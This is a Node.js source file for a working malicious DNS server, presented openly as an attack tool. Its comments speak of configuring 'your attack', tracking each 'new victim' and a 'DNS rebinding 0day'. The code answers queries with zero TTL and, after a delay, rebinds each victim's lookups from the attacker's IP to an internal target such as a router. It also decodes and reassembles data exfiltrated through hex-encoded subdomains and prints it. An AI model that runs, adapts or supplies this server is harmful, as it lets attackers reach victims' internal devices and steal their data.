const dgram = require('dgram');
const server = dgram.createSocket('udp4');

const datastore = [];

// ╔══════════════════════════════════════════════════════════════════╗
// ║                     CONFIGURE YOUR ATTACK HERE                   ║
// ╚══════════════════════════════════════════════════════════════════╝

const ATTACKER_IP = '123.123.123.123';          // ← YOUR REAL PUBLIC/VPS IP
const TARGET_IP    = '192.168.1.1';              // ← Victim's internal target (router, NAS, etc.)
const REBIND_DELAY = 20000;                     // milliseconds before switching to target (15–25s works best)

const ATTACKER_IP_HEX = ATTACKER_IP.split('.').map(n => Number(n).toString(16).padStart(2,'0')).join('');
const TARGET_IP_HEX    = TARGET_IP.split('.').map(n => Number(n).toString(16).padStart(2,'0')).join('');

// Per-client first-seen timestamp for individual rebinding
const clientFirstSeen = new Map();

// Optional: clean old entries every 10 minutes
setInterval(() => {
  const now = Date.now();
  for (const [key, time] of clientFirstSeen.entries()) {
    if (now - time > 3600000) clientFirstSeen.delete(key);
  }
}, 600000);

// ╔══════════════════════════════════════════════════════════════════╗

server.on('error', (err) => {
  console.log(`server error:\n${err.stack}`);
  server.close();
});

server.on('message', (msg, rinfo) => {
  let json = JSON.parse(JSON.stringify(msg));
  var hex = "";
  for (var i = 0; i < json.data.length; i++) {
    hex += json.data[i].toString(16).padStart(2, '0');
  }

  var sync = hex.substring(0, 4);
  var domain_start = hex.substring(26, hex.length);
  var domain_chunk = domain_start.match(/.{1,2}/g);
  var domain = '';
  var org_domain = '';

  for (i = 0; i < domain_chunk.length; i++) {
    newint = parseInt(domain_chunk[i], 16);
    if (newint == 0) break;
    org_domain += domain_chunk[i];
    if (newint == 45) {
      domain += '-';
    } else if (newint < 48 || (newint > 57 && newint < 65) || newint > 122) {
      domain += '.';
    } else {
      domain += String.fromCharCode(newint)
    }
  }

  domain_sp = domain.split('.');
  
  // === Exfiltration still works exactly as before ===
  if (domain_sp.length > 4) {
    datastr = '';
    for (i = 0; i < 3; i++) {
      sub_chunk = domain_sp[i].match(/.{1,2}/g);
      for (i2 = 0; i2 < sub_chunk.length; i2++) {
        newint = parseInt(sub_chunk[i2], 16);
        if (newint > 0) {
          datastr += String.fromCharCode(newint)
        }
      }
    }
    packet = parseInt(domain_sp[3].substring(0, 4), 16);
    packetLength = parseInt(domain_sp[3].substring(4, 8), 16);
    randomStr = domain_sp[4];
    if (!datastore.hasOwnProperty(randomStr)) {
      datastore[randomStr] = [];
    }
    datastore[randomStr].push({ id: packet, 'data': datastr });

    if (packet == packetLength) {
      used_packet = [];
      complete = '';
      data = datastore[randomStr].sort(function (a, b) { return a.id - b.id });
      for (i = 0; i < data.length; i++) {
        if (!used_packet.hasOwnProperty(data[i].id)) {
          used_packet[data[i].id] = true;
          complete += data[i].data;
        }
      }
      console.log('EXFILTRATED DATA: ' + complete);
    }
  }

  // === Rebinding logic (per victim) ===
  const clientKey = rinfo.address; // you can add ":" + rinfo.port if you want per-tab precision
  if (!clientFirstSeen.has(clientKey)) {
    clientFirstSeen.set(clientKey, Date.now());
    console.log(`New victim → ${clientKey} (will rebind in ${REBIND_DELAY/1000}s)`);
  }
  const elapsed = Date.now() - clientFirstSeen.get(clientKey);
  const ip = (elapsed < REBIND_DELAY) ? ATTACKER_IP_HEX : TARGET_IP_HEX;

  // TTL = 0 forces instant re-resolution
  resp = sync + '85000001000100000000' + hex.substring(24, 26) + org_domain + '0000010001c00c00010001000000000004' + ip;
  buf = Buffer.from(resp, "hex");
  server.send(buf, 0, buf.length, rinfo.port, rinfo.address);
});

server.on('listening', () => {
  const address = server.address();
  console.log(`DNS rebinding 0day listening on ${address.address}:${address.port}`);
  console.log(`Point your domain NS records to ${ATTACKER_IP}`);
});

server.bind(53);
